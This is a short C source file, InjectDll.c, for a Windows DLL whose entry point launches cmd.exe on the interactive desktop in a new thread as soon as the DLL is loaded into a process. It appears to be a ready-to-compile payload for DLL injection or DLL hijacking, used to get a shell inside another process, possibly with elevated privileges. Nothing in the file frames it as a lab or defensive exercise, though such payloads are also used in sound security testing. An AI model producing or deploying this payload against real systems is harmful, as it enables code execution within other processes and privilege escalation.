// InjectDll.c
#include <Windows.h>

DWORD WINAPI SpawnCmd(LPVOID lpParam)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.lpDesktop = L"WinSta0\\Default";
    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE,
                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        HANDLE hThread = CreateThread(NULL, 0, SpawnCmd, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}